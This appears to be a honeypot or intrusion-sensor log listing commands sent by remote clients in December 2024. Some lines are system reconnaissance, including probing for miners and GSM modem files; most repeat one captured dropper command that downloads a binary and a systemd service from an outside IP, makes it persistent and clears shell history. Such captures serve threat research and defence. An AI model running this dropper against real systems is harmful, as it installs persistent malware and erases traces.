start
2024-11-29 14:40:17.460267 - ('141.0.99.244', 44570) - /ip cloud print
2024-12-05 09:06:53.016336 - ('14.6.81.179', 43782) - echo Hi | cat -n
2024-12-05 10:15:10.792267 - ('112.159.195.67', 38265) - /ip cloud print
2024-12-05 10:15:11.948268 - ('112.159.195.67', 38265) - ifconfig
2024-12-05 10:15:12.896162 - ('112.159.195.67', 38265) - uname -a
2024-12-05 10:15:13.848082 - ('112.159.195.67', 38265) - cat /proc/cpuinfo
2024-12-05 10:15:14.796107 - ('112.159.195.67', 38265) - ps | grep '[Mm]iner'
2024-12-05 10:15:15.744056 - ('112.159.195.67', 38265) - ps -ef | grep '[Mm]iner'
2024-12-05 10:15:16.692043 - ('112.159.195.67', 38265) - ls -la /dev/ttyGSM* /dev/ttyUSB-mod* /var/spool/sms/* /var/log/smsd.log /etc/smsd.conf* /usr/bin/qmuxd /var/qmux_connect_socket /etc/config/simman /dev/modem* /var/config/sms/*
2024-12-05 10:15:17.648130 - ('112.159.195.67', 38265) - echo Hi | cat -n
2024-12-05 10:17:44.642337 - ('45.148.10.46', 47010) - apt
2024-12-05 10:17:48.358260 - ('45.148.10.46', 47010) - apt -y install curl && rm -rf /etc/de && pkill cARM ; mkdir /etc/de && curl -k -o /etc/de/cARM http://51.81.121.129/cARM && curl -k -o /etc/systemd/system/sshell.service http://51.81.121.129/sshell.service && chmod 777 /etc/de/cARM ; systemctl daemon-reload && systemctl enable sshell.service && systemctl start sshell.service && history -c

2024-12-05 10:18:05.158328 - ('45.148.10.46', 52132) - apt
2024-12-05 10:18:06.666666 - ('45.148.10.46', 52132) - apt -y install curl && rm -rf /etc/de && pkill cARM ; mkdir /etc/de && curl -k -o /etc/de/cARM http://51.81.121.129/cARM && curl -k -o /etc/systemd/system/sshell.service http://51.81.121.129/sshell.service && chmod 777 /etc/de/cARM ; systemctl daemon-reload && systemctl enable sshell.service && systemctl start sshell.service && history -c

2024-12-05 10:18:23.677370 - ('45.148.10.46', 39366) - apt
2024-12-05 10:18:24.771897 - ('45.148.10.46', 39366) - apt -y install curl && rm -rf /etc/de && pkill cARM ; mkdir /etc/de && curl -k -o /etc/de/cARM http://51.81.121.129/cARM && curl -k -o /etc/systemd/system/sshell.service http://51.81.121.129/sshell.service && chmod 777 /etc/de/cARM ; systemctl daemon-reload && systemctl enable sshell.service && systemctl start sshell.service && history -c

2024-12-05 10:18:39.557551 - ('45.148.10.46', 59250) - apt
2024-12-05 10:18:40.865227 - ('45.148.10.46', 59250) - apt -y install curl && rm -rf /etc/de && pkill cARM ; mkdir /etc/de && curl -k -o /etc/de/cARM http://51.81.121.129/cARM && curl -k -o /etc/systemd/system/sshell.service http://51.81.121.129/sshell.service && chmod 777 /etc/de/cARM ; systemctl daemon-reload && systemctl enable sshell.service && systemctl start sshell.service && history -c

2024-12-05 10:18:58.158844 - ('45.148.10.46', 36756) - apt
2024-12-05 10:18:59.259598 - ('45.148.10.46', 36756) - apt -y install curl && rm -rf /etc/de && pkill cARM ; mkdir /etc/de && curl -k -o /etc/de/cARM http://51.81.121.129/cARM && curl -k -o /etc/systemd/system/sshell.service http://51.81.121.129/sshell.service && chmod 777 /etc/de/cARM ; systemctl daemon-reload && systemctl enable sshell.service && systemctl start sshell.service && history -c

2024-12-05 10:19:15.970954 - ('45.148.10.46', 53956) - apt
2024-12-05 10:19:17.460576 - ('45.148.10.46', 53956) - apt -y install curl && rm -rf /etc/de && pkill cARM ; mkdir /etc/de && curl -k -o /etc/de/cARM http://51.81.121.129/cARM && curl -k -o /etc/systemd/system/sshell.service http://51.81.121.129/sshell.service && chmod 777 /etc/de/cARM ; systemctl daemon-reload && systemctl enable sshell.service && systemctl start sshell.service && history -c

2024-12-05 10:19:33.472664 - ('45.148.10.46', 49798) - apt
2024-12-05 10:19:34.671918 - ('45.148.10.46', 49798) - apt -y install curl && rm -rf /etc/de && pkill cARM ; mkdir /etc/de && curl -k -o /etc/de/cARM http://51.81.121.129/cARM && curl -k -o /etc/systemd/system/sshell.service http://51.81.121.129/sshell.service && chmod 777 /etc/de/cARM ; systemctl daemon-reload && systemctl enable sshell.service && systemctl start sshell.service && history -c

2024-12-05 10:19:49.873273 - ('45.148.10.46', 55568) - apt
2024-12-05 10:19:51.274755 - ('45.148.10.46', 55568) - apt -y install curl && rm -rf /etc/de && pkill cARM ; mkdir /etc/de && curl -k -o /etc/de/cARM http://51.81.121.129/cARM && curl -k -o /etc/systemd/system/sshell.service http://51.81.121.129/sshell.service && chmod 777 /etc/de/cARM ; systemctl daemon-reload && systemctl enable sshell.service && systemctl start sshell.service && history -c

2024-12-05 10:20:08.068967 - ('45.148.10.46', 55816) - apt
2024-12-05 10:20:09.056738 - ('45.148.10.46', 55816) - apt -y install curl && rm -rf /etc/de && pkill cARM ; mkdir /etc/de && curl -k -o /etc/de/cARM http://51.81.121.129/cARM && curl -k -o /etc/systemd/system/sshell.service http://51.81.121.129/sshell.service && chmod 777 /etc/de/cARM ; systemctl daemon-reload && systemctl enable sshell.service && systemctl start sshell.service && history -c

2024-12-05 10:20:23.576793 - ('45.148.10.46', 52920) - apt
2024-12-05 10:20:25.278200 - ('45.148.10.46', 52920) - apt -y install curl && rm -rf /etc/de && pkill cARM ; mkdir /etc/de && curl -k -o /etc/de/cARM http://51.81.121.129/cARM && curl -k -o /etc/systemd/system/sshell.service http://51.81.121.129/sshell.service && chmod 777 /etc/de/cARM ; systemctl daemon-reload && systemctl enable sshell.service && systemctl start sshell.service && history -c

2024-12-05 10:20:41.974510 - ('45.148.10.46', 58160) - apt
2024-12-05 10:20:43.472749 - ('45.148.10.46', 58160) - apt -y install curl && rm -rf /etc/de && pkill cARM ; mkdir /etc/de && curl -k -o /etc/de/cARM http://51.81.121.129/cARM && curl -k -o /etc/systemd/system/sshell.service http://51.81.121.129/sshell.service && chmod 777 /etc/de/cARM ; systemctl daemon-reload && systemctl enable sshell.service && systemctl start sshell.service && history -c

2024-12-05 10:20:58.272380 - ('45.148.10.46', 54162) - apt
2024-12-05 10:20:59.777455 - ('45.148.10.46', 54162) - apt -y install curl && rm -rf /etc/de && pkill cARM ; mkdir /etc/de && curl -k -o /etc/de/cARM http://51.81.121.129/cARM && curl -k -o /etc/systemd/system/sshell.service http://51.81.121.129/sshell.service && chmod 777 /etc/de/cARM ; systemctl daemon-reload && systemctl enable sshell.service && systemctl start sshell.service && history -c

2024-12-05 10:21:15.759972 - ('45.148.10.46', 50376) - apt
2024-12-05 10:21:16.856981 - ('45.148.10.46', 50376) - apt -y install curl && rm -rf /etc/de && pkill cARM ; mkdir /etc/de && curl -k -o /etc/de/cARM http://51.81.121.129/cARM && curl -k -o /etc/systemd/system/sshell.service http://51.81.121.129/sshell.service && chmod 777 /etc/de/cARM ; systemctl daemon-reload && systemctl enable sshell.service && systemctl start sshell.service && history -c

2024-12-05 10:21:33.766324 - ('45.148.10.46', 57962) - apt
2024-12-05 10:21:34.857801 - ('45.148.10.46', 57962) - apt -y install curl && rm -rf /etc/de && pkill cARM ; mkdir /etc/de && curl -k -o /etc/de/cARM http://51.81.121.129/cARM && curl -k -o /etc/systemd/system/sshell.service http://51.81.121.129/sshell.service && chmod 777 /etc/de/cARM ; systemctl daemon-reload && systemctl enable sshell.service && systemctl start sshell.service && history -c

2024-12-05 10:21:50.647773 - ('45.148.10.46', 47976) - apt
2024-12-05 10:21:52.047431 - ('45.148.10.46', 47976) - apt -y install curl && rm -rf /etc/de && pkill cARM ; mkdir /etc/de && curl -k -o /etc/de/cARM http://51.81.121.129/cARM && curl -k -o /etc/systemd/system/sshell.service http://51.81.121.129/sshell.service && chmod 777 /etc/de/cARM ; systemctl daemon-reload && systemctl enable sshell.service && systemctl start sshell.service && history -c

2024-12-05 10:22:07.869456 - ('45.148.10.46', 35930) - apt
2024-12-05 10:22:09.959690 - ('45.148.10.46', 35930) - apt -y install curl && rm -rf /etc/de && pkill cARM ; mkdir /etc/de && curl -k -o /etc/de/cARM http://51.81.121.129/cARM && curl -k -o /etc/systemd/system/sshell.service http://51.81.121.129/sshell.service && chmod 777 /etc/de/cARM ; systemctl daemon-reload && systemctl enable sshell.service && systemctl start sshell.service && history -c

2024-12-05 10:22:24.260850 - ('45.148.10.46', 35692) - apt
2024-12-05 10:22:25.764531 - ('45.148.10.46', 35692) - apt -y install curl && rm -rf /etc/de && pkill cARM ; mkdir /etc/de && curl -k -o /etc/de/cARM http://51.81.121.129/cARM && curl -k -o /etc/systemd/system/sshell.service http://51.81.121.129/sshell.service && chmod 777 /etc/de/cARM ; systemctl daemon-reload && systemctl enable sshell.service && systemctl start sshell.service && history -c

2024-12-05 10:22:41.540454 - ('45.148.10.46', 58542) - apt
2024-12-05 10:22:42.745075 - ('45.148.10.46', 58542) - apt -y install curl && rm -rf /etc/de && pkill cARM ; mkdir /etc/de && curl -k -o /etc/de/cARM http://51.81.121.129/cARM && curl -k -o /etc/systemd/system/sshell.service http://51.81.121.129/sshell.service && chmod 777 /etc/de/cARM ; systemctl daemon-reload && systemctl enable sshell.service && systemctl start sshell.service && history -c

2024-12-05 10:22:57.876687 - ('45.148.10.46', 54588) - apt
2024-12-05 10:22:59.300110 - ('45.148.10.46', 54588) - apt -y install curl && rm -rf /etc/de && pkill cARM ; mkdir /etc/de && curl -k -o /etc/de/cARM http://51.81.121.129/cARM && curl -k -o /etc/systemd/system/sshell.service http://51.81.121.129/sshell.service && chmod 777 /etc/de/cARM ; systemctl daemon-reload && systemctl enable sshell.service && systemctl start sshell.service && history -c

2024-12-05 10:23:15.470557 - ('45.148.10.46', 53850) - apt
2024-12-05 10:23:16.506706 - ('45.148.10.46', 53850) - apt -y install curl && rm -rf /etc/de && pkill cARM ; mkdir /etc/de && curl -k -o /etc/de/cARM http://51.81.121.129/cARM && curl -k -o /etc/systemd/system/sshell.service http://51.81.121.129/sshell.service && chmod 777 /etc/de/cARM ; systemctl daemon-reload && systemctl enable sshell.service && systemctl start sshell.service && history -c

2024-12-05 10:23:32.273580 - ('45.148.10.46', 57122) - apt
2024-12-05 10:23:34.288464 - ('45.148.10.46', 57122) - apt -y install curl && rm -rf /etc/de && pkill cARM ; mkdir /etc/de && curl -k -o /etc/de/cARM http://51.81.121.129/cARM && curl -k -o /etc/systemd/system/sshell.service http://51.81.121.129/sshell.service && chmod 777 /etc/de/cARM ; systemctl daemon-reload && systemctl enable sshell.service && systemctl start sshell.service && history -c

2024-12-05 10:23:49.442450 - ('45.148.10.46', 42774) - apt
2024-12-05 10:23:50.541693 - ('45.148.10.46', 42774) - apt -y install curl && rm -rf /etc/de && pkill cARM ; mkdir /etc/de && curl -k -o /etc/de/cARM http://51.81.121.129/cARM && curl -k -o /etc/systemd/system/sshell.service http://51.81.121.129/sshell.service && chmod 777 /etc/de/cARM ; systemctl daemon-reload && systemctl enable sshell.service && systemctl start sshell.service && history -c

2024-12-05 10:24:06.375430 - ('45.148.10.46', 47954) - apt
2024-12-05 10:24:08.182720 - ('45.148.10.46', 47954) - apt -y install curl && rm -rf /etc/de && pkill cARM ; mkdir /etc/de && curl -k -o /etc/de/cARM http://51.81.121.129/cARM && curl -k -o /etc/systemd/system/sshell.service http://51.81.121.129/sshell.service && chmod 777 /etc/de/cARM ; systemctl daemon-reload && systemctl enable sshell.service && systemctl start sshell.service && history -c

2024-12-05 10:24:23.463056 - ('45.148.10.46', 51616) - apt
2024-12-05 10:24:24.665184 - ('45.148.10.46', 51616) - apt -y install curl && rm -rf /etc/de && pkill cARM ; mkdir /etc/de && curl -k -o /etc/de/cARM http://51.81.121.129/cARM && curl -k -o /etc/systemd/system/sshell.service http://51.81.121.129/sshell.service && chmod 777 /etc/de/cARM ; systemctl daemon-reload && systemctl enable sshell.service && systemctl start sshell.service && history -c

2024-12-05 10:24:39.459663 - ('45.148.10.46', 55624) - apt
2024-12-05 10:24:41.145166 - ('45.148.10.46', 55624) - apt -y install curl && rm -rf /etc/de && pkill cARM ; mkdir /etc/de && curl -k -o /etc/de/cARM http://51.81.121.129/cARM && curl -k -o /etc/systemd/system/sshell.service http://51.81.121.129/sshell.service && chmod 777 /etc/de/cARM ; systemctl daemon-reload && systemctl enable sshell.service && systemctl start sshell.service && history -c

2024-12-05 10:24:57.242529 - ('45.148.10.46', 59366) - apt
2024-12-05 10:24:58.441612 - ('45.148.10.46', 59366) - apt -y install curl && rm -rf /etc/de && pkill cARM ; mkdir /etc/de && curl -k -o /etc/de/cARM http://51.81.121.129/cARM && curl -k -o /etc/systemd/system/sshell.service http://51.81.121.129/sshell.service && chmod 777 /etc/de/cARM ; systemctl daemon-reload && systemctl enable sshell.service && systemctl start sshell.service && history -c

2024-12-05 10:25:14.675748 - ('45.148.10.46', 51204) - apt
2024-12-05 10:25:16.472483 - ('45.148.10.46', 51204) - apt -y install curl && rm -rf /etc/de && pkill cARM ; mkdir /etc/de && curl -k -o /etc/de/cARM http://51.81.121.129/cARM && curl -k -o /etc/systemd/system/sshell.service http://51.81.121.129/sshell.service && chmod 777 /etc/de/cARM ; systemctl daemon-reload && systemctl enable sshell.service && systemctl start sshell.service && history -c

2024-12-05 10:25:31.776658 - ('45.148.10.46', 58782) - apt
2024-12-05 10:25:33.983797 - ('45.148.10.46', 58782) - apt -y install curl && rm -rf /etc/de && pkill cARM ; mkdir /etc/de && curl -k -o /etc/de/cARM http://51.81.121.129/cARM && curl -k -o /etc/systemd/system/sshell.service http://51.81.121.129/sshell.service && chmod 777 /etc/de/cARM ; systemctl daemon-reload && systemctl enable sshell.service && systemctl start sshell.service && history -c

2024-12-05 10:25:50.113991 - ('45.148.10.46', 42460) - apt
2024-12-05 10:25:51.394864 - ('45.148.10.46', 42460) - apt -y install curl && rm -rf /etc/de && pkill cARM ; mkdir /etc/de && curl -k -o /etc/de/cARM http://51.81.121.129/cARM && curl -k -o /etc/systemd/system/sshell.service http://51.81.121.129/sshell.service && chmod 777 /etc/de/cARM ; systemctl daemon-reload && systemctl enable sshell.service && systemctl start sshell.service && history -c

2024-12-05 10:26:06.777890 - ('45.148.10.46', 45044) - apt
2024-12-05 10:26:08.474903 - ('45.148.10.46', 45044) - apt -y install curl && rm -rf /etc/de && pkill cARM ; mkdir /etc/de && curl -k -o /etc/de/cARM http://51.81.121.129/cARM && curl -k -o /etc/systemd/system/sshell.service http://51.81.121.129/sshell.service && chmod 777 /etc/de/cARM ; systemctl daemon-reload && systemctl enable sshell.service && systemctl start sshell.service && history -c

2024-12-05 10:26:24.462026 - ('45.148.10.46', 47684) - apt
2024-12-05 10:26:25.565247 - ('45.148.10.46', 47684) - apt -y install curl && rm -rf /etc/de && pkill cARM ; mkdir /etc/de && curl -k -o /etc/de/cARM http://51.81.121.129/cARM && curl -k -o /etc/systemd/system/sshell.service http://51.81.121.129/sshell.service && chmod 777 /etc/de/cARM ; systemctl daemon-reload && systemctl enable sshell.service && systemctl start sshell.service && history -c

2024-12-05 10:26:41.357096 - ('45.148.10.46', 45040) - apt
2024-12-05 10:26:43.257842 - ('45.148.10.46', 45040) - apt -y install curl && rm -rf /etc/de && pkill cARM ; mkdir /etc/de && curl -k -o /etc/de/cARM http://51.81.121.129/cARM && curl -k -o /etc/systemd/system/sshell.service http://51.81.121.129/sshell.service && chmod 777 /etc/de/cARM ; systemctl daemon-reload && systemctl enable sshell.service && systemctl start sshell.service && history -c

2024-12-05 10:26:58.706359 - ('45.148.10.46', 54746) - apt
2024-12-05 10:27:00.174737 - ('45.148.10.46', 54746) - apt -y install curl && rm -rf /etc/de && pkill cARM ; mkdir /etc/de && curl -k -o /etc/de/cARM http://51.81.121.129/cARM && curl -k -o /etc/systemd/system/sshell.service http://51.81.121.129/sshell.service && chmod 777 /etc/de/cARM ; systemctl daemon-reload && systemctl enable sshell.service && systemctl start sshell.service && history -c

2024-12-05 10:29:33.359927 - ('45.148.10.46', 35086) - apt
2024-12-05 11:11:30.153873 - ('49.160.235.3', 39540) - /ip cloud print
2024-12-05 11:11:31.281779 - ('49.160.235.3', 39540) - ifconfig
2024-12-05 11:11:32.201570 - ('49.160.235.3', 39540) - uname -a
2024-12-05 11:11:33.121619 - ('49.160.235.3', 39540) - cat /proc/cpuinfo
2024-12-05 11:11:34.041391 - ('49.160.235.3', 39540) - ps | grep '[Mm]iner'
2024-12-05 11:11:34.961454 - ('49.160.235.3', 39540) - ps -ef | grep '[Mm]iner'
2024-12-05 11:11:35.881421 - ('49.160.235.3', 39540) - ls -la /dev/ttyGSM* /dev/ttyUSB-mod* /var/spool/sms/* /var/log/smsd.log /etc/smsd.conf* /usr/bin/qmuxd /var/qmux_connect_socket /etc/config/simman /dev/modem* /var/config/sms/*
2024-12-05 11:11:36.801329 - ('49.160.235.3', 39540) - echo Hi | cat -n
2024-12-05 11:17:21.962502 - ('195.178.110.34', 59368) - apt
2024-12-05 11:17:23.248108 - ('195.178.110.34', 59368) - apt -y install curl && rm -rf /etc/de && pkill cARM ; mkdir /etc/de && curl -k -o /etc/de/cARM http://51.81.121.129/cARM && curl -k -o /etc/systemd/system/sshell.service http://51.81.121.129/sshell.service && chmod 777 /etc/de/cARM ; systemctl daemon-reload && systemctl enable sshell.service && systemctl start sshell.service && history -c

2024-12-05 11:17:31.180409 - ('195.178.110.34', 51936) - apt
2024-12-05 11:17:32.952883 - ('195.178.110.34', 51936) - apt -y install curl && rm -rf /etc/de && pkill cARM ; mkdir /etc/de && curl -k -o /etc/de/cARM http://51.81.121.129/cARM && curl -k -o /etc/systemd/system/sshell.service http://51.81.121.129/sshell.service && chmod 777 /etc/de/cARM ; systemctl daemon-reload && systemctl enable sshell.service && systemctl start sshell.service && history -c

2024-12-05 11:17:41.263014 - ('195.178.110.34', 33030) - apt
2024-12-05 11:17:42.574542 - ('195.178.110.34', 33030) - apt -y install curl && rm -rf /etc/de && pkill cARM ; mkdir /etc/de && curl -k -o /etc/de/cARM http://51.81.121.129/cARM && curl -k -o /etc/systemd/system/sshell.service http://51.81.121.129/sshell.service && chmod 777 /etc/de/cARM ; systemctl daemon-reload && systemctl enable sshell.service && systemctl start sshell.service && history -c

2024-12-05 11:17:51.532831 - ('195.178.110.34', 50080) - apt
2024-12-05 11:17:52.764243 - ('195.178.110.34', 50080) - apt -y install curl && rm -rf /etc/de && pkill cARM ; mkdir /etc/de && curl -k -o /etc/de/cARM http://51.81.121.129/cARM && curl -k -o /etc/systemd/system/sshell.service http://51.81.121.129/sshell.service && chmod 777 /etc/de/cARM ; systemctl daemon-reload && systemctl enable sshell.service && systemctl start sshell.service && history -c

2024-12-05 11:18:01.735271 - ('195.178.110.34', 54336) - apt
2024-12-05 11:18:03.235910 - ('195.178.110.34', 54336) - apt -y install curl && rm -rf /etc/de && pkill cARM ; mkdir /etc/de && curl -k -o /etc/de/cARM http://51.81.121.129/cARM && curl -k -o /etc/systemd/system/sshell.service http://51.81.121.129/sshell.service && chmod 777 /etc/de/cARM ; systemctl daemon-reload && systemctl enable sshell.service && systemctl start sshell.service && history -c

2024-12-05 11:18:11.859289 - ('195.178.110.34', 58646) - apt
2024-12-05 11:18:13.354319 - ('195.178.110.34', 58646) - apt -y install curl && rm -rf /etc/de && pkill cARM ; mkdir /etc/de && curl -k -o /etc/de/cARM http://51.81.121.129/cARM && curl -k -o /etc/systemd/system/sshell.service http://51.81.121.129/sshell.service && chmod 777 /etc/de/cARM ; systemctl daemon-reload && systemctl enable sshell.service && systemctl start sshell.service && history -c

2024-12-05 12:04:01.124343 - ('45.148.10.203', 48314) - apt
2024-12-05 12:04:02.301455 - ('45.148.10.203', 48314) - apt -y install curl && rm -rf /etc/de && pkill cARM ; mkdir /etc/de && curl -k -o /etc/de/cARM http://51.81.121.129/cARM && curl -k -o /etc/systemd/system/sshell.service http://51.81.121.129/sshell.service && chmod 777 /etc/de/cARM ; systemctl daemon-reload && systemctl enable sshell.service && systemctl start sshell.service && history -c

2024-12-05 12:04:09.381416 - ('45.148.10.203', 54882) - apt
2024-12-05 12:04:10.523844 - ('45.148.10.203', 54882) - apt -y install curl && rm -rf /etc/de && pkill cARM ; mkdir /etc/de && curl -k -o /etc/de/cARM http://51.81.121.129/cARM && curl -k -o /etc/systemd/system/sshell.service http://51.81.121.129/sshell.service && chmod 777 /etc/de/cARM ; systemctl daemon-reload && systemctl enable sshell.service && systemctl start sshell.service && history -c
